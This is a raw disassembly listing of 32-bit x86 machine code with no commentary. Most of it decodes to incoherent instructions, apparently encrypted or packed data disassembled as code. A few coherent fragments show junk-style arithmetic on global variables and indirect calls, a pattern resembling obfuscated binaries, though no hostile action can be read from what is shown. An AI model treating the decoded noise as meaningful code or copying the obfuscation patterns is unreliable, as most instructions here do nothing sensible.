  417cd2:	mov    al,0x25
  417cd4:	fwait
  417cd5:	out    0x98,eax
  417cd7:	dec    ebp
  417cd8:	in     eax,0xe4
  417cda:	and    esi,DWORD PTR [esi]
  417cdc:	fdivr  DWORD PTR [eax+0x3e]
  417cdf:	lods   eax,DWORD PTR ds:[esi]
  417ce0:	cld    
  417ce1:	inc    esi
  417ce2:	cmovae esi,DWORD PTR [edx]
  417ce5:	shr    bh,0x8b
  417ce8:	imul   edi,DWORD PTR [ebx+edi*2-0x4f3163cc],0xb897331b
  417cf3:	sub    eax,0x9465f515
  417cf8:	mov    ds:0xfe46a966,al
  417cfd:	js     0x417d11
  417cff:	shl    DWORD PTR [edi-0x3d],1
  417d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d03:	mov    al,BYTE PTR [edx]
  417d05:	or     ebx,DWORD PTR [ecx]
  417d07:	loop   0x417d1d
  417d09:	xchg   ebp,eax
  417d0a:	loope  0x417ce2
  417d0c:	and    eax,0xbe09e718
  417d11:	mov    dl,0x5e
  417d13:	lock out dx,al
  417d15:	daa    
  417d16:	sub    BYTE PTR [ecx+0x5d2b276a],0x89
  417d1d:	lock pop ebx
  417d1f:	ins    DWORD PTR es:[edi],dx
  417d20:	sub    DWORD PTR [eax+0x42],edi
  417d23:	add    eax,0xd1b3106b
  417d28:	dec    ecx
  417d29:	sub    BYTE PTR [edi],0x38
  417d2c:	cmp    ch,BYTE PTR [ebx+0x74fdd832]
  417d32:	imul   edi,DWORD PTR [ebx+0x8],0x40
  417d36:	xor    eax,0x5e4f8f58
  417d3b:	(bad)  
  417d3c:	stc    
  417d3d:	jle    0x417cff
  417d3f:	push   es
  417d40:	mov    al,0xc2
  417d42:	inc    edx
  417d43:	push   eax
  417d44:	inc    ebx
  417d45:	(bad)  
  417d46:	or     edi,eax
  417d48:	int3   
  417d49:	fbstp  TBYTE PTR [edi-0x54]
  417d4c:	cli    
  417d4d:	clc    
  417d4e:	xchg   ebp,eax
  417d4f:	pop    edx
  417d50:	fmul   QWORD PTR [eax]
  417d52:	inc    esi
  417d53:	nop
  417d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d55:	jo     0x417d82
  417d57:	cmp    cl,BYTE PTR ds:[ebp-0x23]
  417d5b:	and    eax,0xeef3afd5
  417d60:	mov    eax,ds:0x22042435
  417d65:	retf   0xcf08
  417d68:	mov    bl,0xd3
  417d6a:	scas   eax,DWORD PTR es:[di]
  417d6c:	popf   
  417d6d:	call   0x245f:0xaf94db3d
  417d74:	mov    esp,0x19b8fa9c
  417d79:	xchg   DWORD PTR [edx],ebp
  417d7b:	or     BYTE PTR [ebx+eax*8+0x11575a90],0x7d
  417d83:	in     al,0xee
  417d85:	jmp    0x8b0431b2
  417d8a:	inc    esi
  417d8b:	sbb    al,BYTE PTR [esi+0x21]
  417d8e:	ret    0xa13a
  417d91:	fcomip st,st(3)
  417d93:	jno    0x417e04
  417d95:	push   esp
  417d96:	dec    edi
  417d97:	mul    ebx
  417d99:	push   DWORD PTR [edi+eiz*2+0x7f]
  417d9d:	add    bh,BYTE PTR [edi+0x6e]
  417da0:	push   es
  417da1:	test   DWORD PTR [esi+esi*2+0x3f],ebx
  417da5:	iret   
  417da6:	inc    ebx
  417da7:	cmp    eax,0xb79a3340
  417dac:	test   eax,0x1423b9d4
  417db1:	fcom   QWORD PTR [edi+0x4dc7d1d6]
  417db7:	aam    0xd5
  417db9:	leave  
  417dba:	inc    esi
  417dbb:	or     al,0xf7
  417dbd:	add    edx,ecx
  417dbf:	xchg   ebx,eax
  417dc0:	jae    0x417e19
  417dc2:	xor    eax,edx
  417dc4:	in     al,dx
  417dc5:	mov    esp,0x3ba5da5c
  417dca:	ror    edi,0x13
  417dcd:	sbb    cl,BYTE PTR [edx+ecx*4+0x7fdde3ce]
  417dd4:	jl     0x417df1
  417dd6:	cmp    BYTE PTR [ecx-0x27],ah
  417dd9:	cwde   
  417dda:	ins    DWORD PTR es:[edi],dx
  417ddb:	shl    ch,1
  417ddd:	jge    0x417db7
  417ddf:	pusha  
  417de0:	sahf   
  417de1:	arpl   WORD PTR [eax],cx
  417de3:	fwait
  417de4:	push   ds
  417de5:	(bad)
  417de8:	nop
  417de9:	or     al,0xf9
  417deb:	sbb    al,0x90
  417ded:	cmp    DWORD PTR [ecx+edx*8],eax
  417df0:	in     eax,dx
  417df1:	cmc    
  417df2:	(bad)  
  417df3:	pop    edx
  417df4:	jb     0x417de9
  417df6:	sbb    eax,0xadd9ad99
  417dfb:	ucomiss xmm2,DWORD PTR [edi]
  417dfe:	mov    dl,0x1a
  417e00:	jp     0x417da1
  417e02:	in     al,0x36
  417e04:	or     al,0x2
  417e06:	cmp    dh,al
  417e08:	sub    cl,bl
  417e0a:	dec    esp
  417e0b:	inc    edi
  417e0c:	sti    
  417e0d:	fldenv [esi+0x4fdcea8f]
  417e13:	loope  0x417dfe
  417e15:	mov    ds:0xa9a26250,eax
  417e1a:	shr    DWORD PTR [eax-0x1d0cb3f6],cl
  417e20:	loop   0x417dfd
  417e22:	shl    esi,1
  417e24:	in     al,dx
  417e25:	jge    0x417e4e
  417e27:	dec    eax
  417e28:	push   esi
  417e29:	clc    
  417e2a:	inc    esi
  417e2b:	sbb    ch,0x51
  417e2e:	shl    al,cl
  417e30:	inc    eax
  417e31:	lds    eax,FWORD PTR [ebx+eiz*2+0x27]
  417e35:	and    al,0x38
  417e37:	and    ecx,DWORD PTR [eax-0x36]
  417e3a:	aaa    
  417e3b:	sbb    edi,DWORD PTR [edx]
  417e3d:	fs push ds
  417e3f:	or     eax,0x9f95b2b3
  417e44:	and    edi,DWORD PTR [edi+0x4a]
  417e47:	test   eax,0x9e2dee4b
  417e4c:	jl     0x417e75
  417e4e:	jmp    0x2d31f9fa
  417e53:	cmp    eax,0x9e3d6f6a
  417e58:	pop    esi
  417e59:	rol    BYTE PTR ss:[ebp-0xe],cl
  417e5d:	jl     0x417de0
  417e5f:	(bad)  
  417e60:	dec    esi
  417e61:	lds    edi,FWORD PTR [esi]
  417e63:	inc    eax
  417e64:	sbb    ebx,0x2f42217c
  417e6a:	mov    fs,WORD PTR [esp+0x3f051658]
  417e71:	sub    edx,edx
  417e73:	std    
  417e74:	dec    edi
  417e75:	pop    ebp
  417e76:	sbb    eax,0x76c37cac
  417e7b:	dec    ecx
  417e7c:	push   edx
  417e7d:	and    BYTE PTR [ecx+edx*8-0x586f91b5],ch
  417e84:	pop    ebp
  417e85:	xchg   BYTE PTR [ebp+0x2c500af7],dl
  417e8b:	popf   
  417e8c:	in     eax,dx
  417e8d:	les    esi,FWORD PTR [ebx]
  417e8f:	bound  ebp,QWORD PTR [esp+ecx*4+0x3b]
  417e93:	pop    edi
  417e94:	popa   
  417e95:	pushf  
  417e96:	or     al,0x6c
  417e98:	cmp    al,0x32
  417e9a:	fisub  DWORD PTR [edx+0x20]
  417e9d:	push   edx
  417e9e:	dec    ebx
  417e9f:	or     al,0xa0
  417ea1:	mov    al,ds:0x90886235
  417ea6:	dec    edx
  417ea7:	mov    ?,WORD PTR [ecx]
  417ea9:	sbb    ebx,0xffffffaa
  417eac:	ins    DWORD PTR es:[edi],dx
  417ead:	mov    ds:0x334693b1,eax
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x42832f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x4281f3,0x42824b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428343,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42823f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42833b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428343,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e48
  417f43:	sub    DWORD PTR ds:0x428217,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x4281fb
  417f53:	mov    ecx,DWORD PTR ds:0x42825b
  417f59:	and    DWORD PTR ds:0x428157,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428333
  417f65:	mov    ecx,DWORD PTR ds:0x428147
  417f6b:	or     DWORD PTR ds:0x4282db,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42835f
  417f77:	or     DWORD PTR ds:0x428247,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x25
  417f8f:	jge    0x417ff2
  417f91:	jo     0x417fe6
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1-0x3570e7e8],bh
  417f9c:	sub    ebp,DWORD PTR [esi]
  417f9e:	add    ebx,DWORD PTR [edi]
  417fa0:	not    BYTE PTR [ecx-0x34]
  417fa3:	lahf   
  417fa4:	fmulp  st(1),st
  417fa6:	mov    cl,0x28
  417fa8:	sbb    eax,ebx
  417faa:	addr16 jmp 0x417f40
  417fad:	rcr    BYTE PTR [esi-0x29f93f0a],1
  417fb3:	xor    eax,0xe05aa934
  417fb8:	xor    al,0x85
  417fba:	data16 outs dx,BYTE PTR ds:[esi]
  417fbc:	mov    eax,0x53d47daf
  417fc1:	sbb    esi,DWORD PTR [ebx]
  417fc3:	mov    WORD PTR ds:[ecx-0x5de5f452],es
  417fca:	or     dh,BYTE PTR [ebx]
  417fcc:	ror    DWORD PTR [ecx+0xf],cl
  417fcf:	imul   edi,DWORD PTR [eax+edi*8+0x47],0xffffffcd
  417fd4:	push   ds
  417fd5:	pop    edx
  417fd6:	cmp    DWORD PTR [edx-0x5c2297bf],edi
  417fdc:	pop    di
  417fde:	test   BYTE PTR [esi+edi*8-0x5dec65cf],cl
  417fe5:	clc    
  417fe6:	in     al,0x39
  417fe8:	mov    bl,BYTE PTR [edi]
  417fea:	push   esi
  417feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fec:	fs std 
  417fee:	mov    eax,0xd6381732
  417ff3:	cmc    
  417ff4:	outs   dx,BYTE PTR ds:[esi]
  417ff5:	mov    dl,0x81
  417ff7:	cmp    bl,BYTE PTR [esi-0x70de5d58]
  417ffd:	in     al,0xa4
  417fff:	jb     0x418007
  418001:	push   ds
  418002:	xor    bh,ch
  418004:	jno    0x417f9b
  418006:	daa    
  418007:	add    BYTE PTR [eax-0x272c3af4],dh
  41800d:	cmc    
  41800e:	adc    edi,DWORD PTR [ecx-0x25]
  418011:	aaa    
  418012:	arpl   bp,ax
  418014:	int3   
  418015:	mov    al,0x85
  418017:	mov    ecx,DWORD PTR [eax]
  418019:	jg     0x41804a
  41801b:	mov    ebp,0x5e6c7ec2
  418020:	call   FWORD PTR [ebx]
  418022:	sub    eax,ebp
  418024:	sti    
  418025:	gs dec esi
  418027:	push   ds
  418028:	test   eax,0xa0d39bbc
  41802d:	cmc    
  41802e:	jne    0x417fc9
  418030:	(bad)  
  418031:	into   
  418032:	mov    ecx,0xd0b5f11d
  418037:	jp     0x4180aa
  418039:	jno    0x417fcd
  41803b:	lea    edi,[ebx+0x7a74e4ea]
  418041:	das    
  418042:	push   ebp
  418043:	mov    esp,0xa877171
  418048:	xor    ebx,DWORD PTR [eax-0x6b0ec091]
  41804e:	jmp    DWORD PTR [ecx-0x51]
  418051:	mov    DWORD PTR [esi-0x6b866a98],ebx
  418057:	push   0xffffffeb
  418059:	jae    0x417fee
  41805b:	pusha  
  41805c:	(bad)  
  41805e:	adc    esp,ebp
  418060:	stc    
  418061:	int    0x3d
  418063:	add    edi,0xffffffda
  418066:	sub    dh,ah
  418068:	in     al,dx
  418069:	mov    ds:0x238ccfe0,eax
  41806e:	xor    DWORD PTR [ecx+edx*8-0x1b8a5bf2],esi
  418075:	(bad)  
  418076:	mov    edi,0xea4cf045
  41807b:	push   ebx
  41807c:	pop    esp
  41807d:	jbe    0x41809d
  41807f:	int3   
  418080:	inc    esp
  418081:	ret    
  418082:	mov    ebx,0x4c9c707f
  418087:	out    0x33,eax
  418089:	std    
  41808a:	sub    BYTE PTR [esi-0x6a],al
  41808d:	clc    
  41808e:	lods   al,BYTE PTR ds:[esi]
  41808f:	retf   
  418090:	push   esi
  418091:	test   eax,0x8cc19c68
  418096:	stc    
  418097:	dec    edi
  418098:	pop    ebp
  418099:	xchg   BYTE PTR [ecx],ah
  41809b:	jae    0x41809f
  41809d:	xor    al,cl
  41809f:	xchg   edi,eax
  4180a0:	jns    0x41810c
  4180a2:	mov    bl,0x50
  4180a4:	or     al,0x3e
  4180a6:	call   0x3d5d2c9a
  4180ab:	and    esi,DWORD PTR [edi+eax*8]
  4180ae:	mov    al,ds:0xaa23c973
  4180b3:	adc    DWORD PTR [edi-0x771eb984],esi
  4180b9:	dec    edx
  4180ba:	push   esi
  4180bb:	scas   al,BYTE PTR es:[edi]
  4180bc:	push   esi
  4180bd:	jmp    0xc090:0x15130ed8
  4180c4:	mov    bh,0x22
  4180c6:	mov    DWORD PTR [ebp+0x63],ecx
  4180c9:	iret   
  4180ca:	stos   DWORD PTR es:[edi],eax
  4180cb:	mov    al,0x1c
  4180cd:	sti    
  4180ce:	cmp    DWORD PTR [eax-0x70b6b3eb],ecx
  4180d4:	out    dx,eax
  4180d5:	mov    WORD PTR [eax+eiz*1],fs
  4180d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180d9:	loop   0x418146
  4180db:	xor    DWORD PTR [eax+0x4138eb34],esp
  4180e1:	mov    bh,0x4c
  4180e3:	push   edi
  4180e4:	inc    ebx
  4180e5:	and    esp,DWORD PTR [esi+0x3dd1bc1d]
  4180eb:	(bad)  
  4180ec:	push   edi
  4180ed:	arpl   WORD PTR [esi],cx
  4180ef:	sti    
  4180f0:	cs mov ebx,ebp
  4180f3:	inc    ebp
  4180f4:	jnp    0x41809d
  4180f6:	mov    WORD PTR [edx+0xc068b2a],ds
  4180fc:	in     eax,dx
  4180fd:	fwait
  4180fe:	dec    ecx
  4180ff:	sbb    eax,0x9989310b
  418104:	aam    0x7a
  418106:	aaa    
  418107:	ret    
  418108:	mov    eax,0xf5012709
  41810d:	and    edx,esi
  41810f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418110:	in     eax,dx
  418111:	mov    al,ds:0xaadb4e18
  418116:	call   0x590a:0x747dbd00
  41811d:	popa   
  41811e:	push   edi
  41811f:	ja     0x41818b
  418121:	push   edx
  418122:	sub    BYTE PTR [edi+0x79601fdb],dl
  418128:	div    esp
  41812a:	mov    ah,0x9c
  41812c:	aas    
  41812d:	jns    0x418129
  41812f:	ja     0x41817b
  418131:	and    al,0xa0
  418133:	loopne 0x4180c4
  418135:	and    eax,0x30da2107
  41813a:	dec    esi
  41813b:	sub    cl,BYTE PTR [edx+0x22]
  41813e:	shl    DWORD PTR [edi+0x7],0xa3
  418142:	retf   0xef43
  418145:	push   esp
  418146:	fcom   st(4)
  418148:	push   eax
  418149:	sbb    al,0xc
  41814b:	fs inc esp
  41814d:	jmp    DWORD PTR [ebp-0x7f48f284]
  418153:	pop    esi
  418154:	ror    ecx,1
  418156:	loope  0x418119
  418158:	loop   0x418107
  41815a:	push   edi
  41815b:	mov    bh,BYTE PTR [eax-0x4ad88f77]
  418161:	mov    ds:0x1b5856f9,al
  418166:	push   ds
  418167:	lods   al,BYTE PTR ds:[esi]
  418168:	inc    ebx
  418169:	sbb    bl,bl
  41816b:	std    
  41816c:	sub    eax,0xe919e882
  418171:	push   0xffffffdc
  418173:	sbb    BYTE PTR [eax+0x6f],bl
  418176:	jle    0x418183
  418178:	loopne 0x4181f8
  41817a:	push   edx
  41817b:	sbb    cl,BYTE PTR [ebx]
  41817d:	(bad)  
  41817e:	xchg   DWORD PTR [edx-0x3ef6821],ebx
  418184:	ret    0xde69
  418187:	in     eax,0x7a
  418189:	leave  
  41818a:	repnz cmp ch,al
  41818d:	jbe    0x4181f2
  41818f:	scas   eax,DWORD PTR es:[edi]
  418190:	(bad)  
  418191:	loop   0x418190
  418193:	enter  0xa868,0x8b
  418197:	xchg   edx,eax
  418198:	sbb    edi,ebx
  41819a:	call   0xa345cfe
  41819f:	jns    0x418154
  4181a1:	push   0x3e
  4181a3:	jmp    0xbd25e7a6
  4181a8:	enter  0xa379,0x4f
  4181ac:	mov    al,0x43
  4181ae:	jp     0x4181b1
  4181b0:	dec    esp
  4181b1:	pop    edx
  4181b2:	imul   eax,DWORD PTR [edi],0xb04e91c3
  4181b8:	xchg   esi,eax
  4181b9:	xor    al,0x7d
  4181bb:	jno    0x41821f
  4181bd:	push   cs
  4181be:	mov    eax,ds:0x5468e8ac
  4181c3:	rcr    DWORD PTR [esi+0x5a],cl
  4181c6:	ret    
  4181c7:	sbb    al,0xa2
  4181c9:	test   ah,ah
  4181cb:	cmp    eax,0x11f52509
  4181d0:	clc    
  4181d1:	ret    0xab19
  4181d4:	dec    ebp
  4181d5:	pop    esi
  4181d6:	shl    ah,0x35
  4181d9:	inc    ebx
  4181da:	ja     0x4181d5
  4181dc:	jl     0x41819d
  4181de:	and    eax,0xafdb500
  4181e3:	mov    dh,0x2a
  4181e5:	add    edx,DWORD PTR [ebp-0x25]
  4181e8:	nop
  4181e9:	add    al,0xf
  4181eb:	dec    ecx
  4181ec:	inc    ebx
  4181ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ee:	lahf   
  4181ef:	add    al,0x1b
  4181f1:	mov    bl,0x55
  4181f3:	(bad)  
  4181f4:	daa    
  4181f5:	(bad)  
  4181f7:	add    DWORD PTR [esi],0xffffffe5
  4181fa:	sbb    al,0xee
  4181fc:	sbb    ah,BYTE PTR [ecx+edx*2]
  4181ff:	push   esi
  418200:	mov    edi,0x41d25dd2
  418205:	mov    DWORD PTR [edx+0x11],ebx
  418208:	sti    
  418209:	cmp    BYTE PTR [ebx],bh
  41820b:	bound  edx,QWORD PTR [esi+0x5]
  41820e:	ja     0x418221
  418210:	adc    al,cl
  418212:	mov    DWORD PTR [esi-0x65177c7c],ebp
  418218:	imul   edi,ecx,0xffffff8d
  41821b:	fsubp  st(0),st
  41821d:	mov    bl,0x1
  41821f:	add    eax,0xfbcdcaf3
  418224:	ins    DWORD PTR es:[edi],dx
  418225:	test   DWORD PTR [ebp-0x5c],ebp
  418228:	fs or  al,0x72
  41822b:	or     dl,BYTE PTR ds:0xd4a0aa59
  418231:	es test al,0x9c
  418234:	icebp  
  418235:	sub    eax,0x8bb66b8a
  41823a:	xor    BYTE PTR [edi],cl
  41823c:	or     eax,0x96d3c1cd
  418241:	or     dh,BYTE PTR [edx]
  418243:	or     BYTE PTR [edi-0x108ef54],ah
  418249:	scas   eax,DWORD PTR es:[edi]
  41824a:	sub    BYTE PTR [esi-0x5a],dh
  41824d:	pop    esi
  41824e:	or     BYTE PTR [edi],bh
  418250:	ja     0x418281
  418252:	dec    ecx
  418253:	cmp    dh,ch
  418255:	push   eax
  418256:	adc    edi,DWORD PTR [ecx+0x46]
  418259:	push   eax
  41825a:	mov    eax,ds:0x723d48d8
  41825f:	stos   BYTE PTR es:[edi],al
  418260:	xchg   ebx,eax
  418261:	test   eax,0x41647a96
  418266:	mov    ds:0xedd7e80,eax
  41826b:	stos   DWORD PTR es:[edi],eax
  41826c:	mov    eax,0x3c131c95
  418271:	arpl   WORD PTR [edi+ebp*2],di
  418274:	fs sahf 
  418276:	sbb    edx,eax
  418278:	mov    ebp,0x2e8186bf
  41827d:	pop    ebp
  41827e:	shl    BYTE PTR [eax+eiz*1+0x78],1
  418282:	mov    edi,0xa9c6acef
  418287:	push   0xffffffa9
  418289:	rcl    DWORD PTR [edi],1
  41828b:	arpl   WORD PTR [eax-0x79],cx
  41828e:	inc    esi
  41828f:	mov    bl,0xb2
  418291:	mov    DWORD PTR [esp-0x288b3d09],edi
  418298:	jmp    0xd818:0x6fa52425
  41829f:	mov    esp,0x8613230b
  4182a4:	push   eax
  4182a5:	push   es
  4182a6:	mov    esp,0xbb0fbb5e
  4182ab:	mov    esi,0x904ad981
  4182b0:	xor    DWORD PTR [esi],ebx
  4182b2:	sub    DWORD PTR [ecx],esp
  4182b4:	cmp    esi,0x39
  4182b7:	pop    ebx
  4182b8:	repz xor dh,0x0
  4182bc:	sbb    al,0x11
  4182be:	cmp    BYTE PTR [edx+0x36a2ad3f],bh
  4182c4:	ret    
  4182c5:	je     0x4182d6
  4182c7:	add    al,0x8a
  4182c9:	repz dec edi
  4182cb:	fimul  WORD PTR ds:0x6167a498
  4182d1:	dec    esi
  4182d2:	cdq    
  4182d3:	jae    0x418324
  4182d5:	or     bl,BYTE PTR [ecx+eax*4-0x41]
  4182d9:	imul   ecx,DWORD PTR [eax+0x3c2e34cb],0xffffffd9
  4182e0:	add    al,0xd0
  4182e2:	xor    esp,DWORD PTR [ecx-0x65]
  4182e5:	add    al,0x86
  4182e7:	jle    0x418278
  4182e9:	leave  
  4182ea:	fadd   QWORD PTR [edi+0x6554ebe0]
  4182f0:	shl    BYTE PTR [eax+0xae114f],1
  4182f6:	iret   
  4182f7:	xchg   esi,eax
  4182f8:	clc    
  4182f9:	push   0xbf080f32
  4182fe:	stc    
  4182ff:	aad    0xb6
  418301:	or     al,0xaa
  418303:	add    dl,BYTE PTR [edx+0x32]
  418306:	sub    esi,ebp
  418308:	jmp    0xda20:0x8fbbaf1e
  41830f:	fst    DWORD PTR [eax-0x26]
  418312:	retf   0xf31d
  418315:	mov    cl,0x40
  418317:	mov    esp,0x8d01622d
  41831c:	jecxz  0x4182c5
  41831e:	cld    
  41831f:	dec    esp
  418320:	iret   
  418321:	and    BYTE PTR [edi-0x3f],ch
  418324:	repz jp 0x41832a
  418327:	jnp    0x41830e
  418329:	inc    ebx
  41832a:	mov    ah,0xb9
  41832c:	shl    BYTE PTR [esi-0x71],1
  41832f:	loopne 0x4182c4
  418331:	rcr    DWORD PTR [eax+0x27f48805],cl
  418337:	fnstcw WORD PTR [ebx]
  418339:	es mov ebx,ebp
  41833c:	repnz nop
  41833e:	or     eax,0x64864268
  418343:	jl     0x4182dd
  418345:	or     al,0x13
  418347:	cdq    
  418348:	cmp    BYTE PTR [bp+si],dh
  41834b:	dec    eax
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428147,0x0
  418359:	mov    DWORD PTR ds:0x42820b,0x42c6
  418363:	mov    DWORD PTR ds:0x428347,edx
  418369:	mov    DWORD PTR ds:0x428123,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428247,0x243f
  418382:	mov    DWORD PTR ds:0x42821f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428147,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x4282e3
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e4c
  4183ae:	add    DWORD PTR ds:0x4282af,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428233
  4183ba:	xor    DWORD PTR ds:0x4282e7,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282c3
  4183c6:	or     DWORD PTR ds:0x42813f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x4281eb,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x4281ef,0x42815b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42814f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42834f
  418409:	or     DWORD PTR ds:0x428347,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42811f,0x4282e7
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x4281eb,0x0
  418430:	mov    DWORD PTR ds:0x4281fb,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428343,0x5a59
  41844e:	cmp    DWORD PTR ds:0x4281eb,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428043
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428da8
  41846b:	sbb    DWORD PTR ds:0x42822f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428127,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428343
  418485:	xor    ecx,DWORD PTR ds:0x4282ab
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428347,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282bf,0x42822b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428367,0x4281ef
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282bb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	push   cs
  4184f8:	mov    edi,DWORD PTR [ebp-0x50]
  4184fb:	not    cl
  4184fd:	push   ss
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x15a81818],bh
  418505:	fwait
  418506:	das    
  418507:	dec    eax
  418508:	cld    
  418509:	adc    DWORD PTR [eax+0x6e844ef],ecx
  41850f:	push   ss
  418510:	shl    ecx,1
  418512:	jg     0x4184ec
  418514:	mov    al,0xab
  418516:	pop    ds
  418517:	lock or DWORD PTR [edi-0x56e983af],esi
  41851e:	loop   0x41856b
  418520:	or     BYTE PTR ds:0x28f8a0e3,dl
  418526:	push   eax
  418527:	out    0xd8,al
  418529:	cmp    BYTE PTR [ebx+0x155a0945],dl
  41852f:	xor    DWORD PTR [ebx+0x65],0xffffff82
  418533:	lods   eax,DWORD PTR ds:[esi]
  418534:	xor    BYTE PTR [eax+0x3d74f561],0x12
  41853b:	adc    al,0x38
  41853d:	popf   
  41853e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41853f:	dec    edi
  418540:	je     0x418573
  418542:	cld    
  418543:	push   esi
  418544:	or     ebp,DWORD PTR [eax+0x6f1574b8]
  41854a:	xor    al,0x4c
  41854c:	ret    0x85bd
  41854f:	in     eax,dx
  418550:	xchg   edx,eax
  418551:	loope  0x41852c
  418553:	test   bl,0xbb
  418556:	gs push esi
  418558:	sbb    cl,al
  41855a:	jmp    DWORD PTR [ebx]
  41855c:	scas   eax,DWORD PTR es:[edi]
  41855d:	inc    eax
  41855e:	dec    ecx
  41855f:	in     eax,dx
  418560:	lahf   
  418561:	dec    ebx
  418562:	push   ebx
  418563:	aas    
  418564:	jecxz  0x418599
  418566:	retf   0x73c8
  418569:	mov    al,0x36
  41856b:	push   ds
  41856c:	jl     0x41853c
  41856e:	push   esp
  41856f:	popf   
  418570:	sar    ch,1
  418572:	imul   DWORD PTR [ebp-0x2f1b7375]
  418578:	push   0x8a28b76
  41857d:	inc    esi
  41857e:	pop    ebp
  41857f:	push   edx
  418580:	or     DWORD PTR [edx+0x6b4e18f0],ebx
  418586:	push   edi
  418587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418588:	adc    dh,ah
  41858a:	jno    0x4185ac
  41858c:	out    0xe5,al
  41858e:	push   edx
  41858f:	lds    ebp,FWORD PTR ds:0x170ddfa4
  418595:	fist   DWORD PTR [ebx-0x32]
  418598:	test   BYTE PTR [edi],0xb1
  41859b:	and    al,0xa4
  41859d:	add    esi,edi
  41859f:	and    BYTE PTR [ecx+0x178cee5],bh
  4185a5:	inc    edi
  4185a6:	dec    esp
  4185a7:	ins    BYTE PTR es:[edi],dx
  4185a8:	enter  0x8a72,0x7e
  4185ac:	jmp    0xafa2005c
  4185b1:	popa   
  4185b2:	or     ebp,ecx
  4185b4:	xchg   edx,eax
  4185b5:	adc    edx,DWORD PTR [ecx+0x5f0dfefa]
  4185bb:	outs   dx,DWORD PTR ds:[esi]
  4185bc:	lahf   
  4185bd:	cmp    ecx,DWORD PTR [eax-0x51]
  4185c0:	ja     0x4185f8
  4185c2:	lahf   
  4185c3:	out    dx,eax
  4185c4:	fst    DWORD PTR [eax+0x11]
  4185c7:	retf   0xceed
  4185ca:	int    0x70
  4185cc:	jle    0x41864d
  4185ce:	dec    edx
  4185cf:	data16 fmul st,st(0)
  4185d2:	or     eax,0xe475b021
  4185d7:	jecxz  0x4185c6
